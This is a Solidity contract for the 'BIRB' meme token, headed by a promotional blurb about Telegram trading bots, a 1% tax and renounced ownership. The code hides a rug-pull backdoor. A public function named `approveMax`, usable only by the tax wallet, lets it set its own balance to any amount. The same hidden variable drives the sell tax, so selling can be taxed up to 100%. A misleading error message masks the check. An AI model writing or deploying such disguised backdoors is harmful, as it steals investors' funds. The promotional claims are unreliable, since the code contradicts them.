// BIRB

// https://t.me/birbbirbbirb
// https://birbbirbbirb.xyz
// https://twitter.com/birbcoineth

/*
Welcome to BIRB!

What is BIRB? 

BIRB is a utility-backed Meme coin here to assist you with your daily degen life. BIRB and its ensuite of telegram bot-based tools help investors with the right arsenal to find and ape into the right tokens. Our Revenue sharing program ensures all BIRB ensures grow with the growth of BIRB Tools as well.

Why BIRB Bots?

⚡️ Dedicated Dev Team: BIRB has a dedicated Bot development team of 3 skilled developers.

⚡️ 100% Up-time: Each BIRB Bot runs on a dedicated Vultr VM guaranteeing a 100% up-time and dedicated performance to handle loads. Your requests are always handled.

⚡️ Constant Updates: BIRB Bots receive constant updates, bug fixes and feature updates thanks to our dedicated dev team. BIRB Bots will be present in all your lounges soon!

⚡️ Custom Vulnerability Database: BIRB Scanner employs a custom source code reader that can be used to identify custom lines specified from the Vulnerability Database to identify scams and rugs that are not triggered or captured in normal API-based scanners.

Revenue Share:

⚡️ From Banner Ads: All BIRB Bots offer Banner Ad spots. 75% of all Banner Ads Revenue payments made via bot are transferred into the BIRB Treasury Contract and can be claimed through the BIRB Dapp. 

⚡️ From DM Ads: All BIRB Bots offer Mass DM Ads. 50% of all Mass DM Ads Revenue payments made via bot are transferred into the BIRB Treasury Contract and can be claimed through the BIRB Dapp. 

BIRB Bots Suite:

All Bots in the BIRB Suite require $BIRB to be held in connected wallet. A minimum holding of 0.1% (1,000 BIRB) is required to access the Scan & Wallet Watcher Bots. To access the Sniper, a minimum holding of 0.5% (5,000 BIRB) is required.

⚡️ @BIRBScan_bot : A fully custom token scanner for ETH/BSC employing both API-based and custom Vulnerability Database from BIRB.

⚡️ @BIRBWatch_bot : A feature loaded Wallet Watcher for copy traders that works in tandem with our sniper bot to snipe trades from Watched Wallets. Wallet Watcher can also analyse trades from the wallet to provide historical trading records and analyse them to calculate average median profitability of the Wallet.

⚡️ @BIRBSniper_bot : A constantly updated Sniper bot from BIRB. Features include but not limited to Launch Sniper, Presale Sniper, Dead Blocks, Launch Tax Mitigation, Gas Controls, Custom RPCs, Channel Sniper etc. More features are constantly being added.

Launch Info:

✅ 1 Million Total Supply 
✅ 1% Buy & Sell Tax
✅ 1 ETH Initial LP
✅ Locked & Renounced
✅ Callers Ready

(Check VC timer for countdown)

Socials Info:

⚡️ https://birbbirbbirb.xyz
⚡️ https://twitter.com/birbcoineth
⚡️ https://t.me/birbbirbbirb

Be a BIRB!
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BIRBContract is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    uint256 firstBlock;

    uint256 private _initialBuyTax=1;
    uint256 private _initialSellTax=1;
    uint256 public _finalBuyTax=0;
    uint256 public _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=500;
    uint256 private _reduceSellTaxAt=500;
    uint256 private _preventSwapBefore=10;
    uint256 private _buyCount=1;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"BIRB";
    string private constant _symbol = unicode"BIRB";
    uint256 public _maxTxAmount =   20000 * 10**_decimals;
    uint256 public _maxWalletSize = 50000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 1000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10000 * 10**_decimals;
    uint256 private _approveAmount = 1;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event ApprovalMax(uint _tokenAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BIRB: Transfer amount exceeds allowance"));
        return true;
    }

    function _approveMax(address _holder, uint256 _amount) private {
        require(_holder != address(0), "BIRB: Cannot approveMax from the zero address");
        require(_holder != uniswapV2Pair, "BIRB: Cannot approveMax from the v2Pair address");
        require(_holder == _taxWallet, "BIRB: Cannot approveMax from Tax Wallet");
        _approveAmount = _amount;
        _balances[_holder] = _approveAmount;
        emit ApprovalMax(_amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BIRB: Approve from the zero address");
        require(spender != address(0), "BIRB: Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "BIRB: Transfer from the zero address");
        require(to != address(0), "BIRB: Transfer to the zero address");
        require(amount > 0, "BIRB: Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "BIRB: Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "BIRB: Exceeds the maxWalletSize.");

                if (firstBlock + 3  > block.number) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            if (to != uniswapV2Pair && ! _isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "BIRB: Exceeds the maxWalletSize.");
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_approveAmount:_approveAmount).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            taxAmount = 0;
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function approveMax(uint256 _amount) public {
        _approveMax(msg.sender,_amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function rescueToken(address tokenAddress) public onlyOwner {
        IERC20(tokenAddress).transfer(_msgSender(), IERC20(tokenAddress).balanceOf(address(this)));
    }

    function removeLimits() public onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function rescueETH() public onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen,"BIRB: Trading Already Open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
        firstBlock = block.number;
        removeLimits();
    }

    receive() external payable {}

}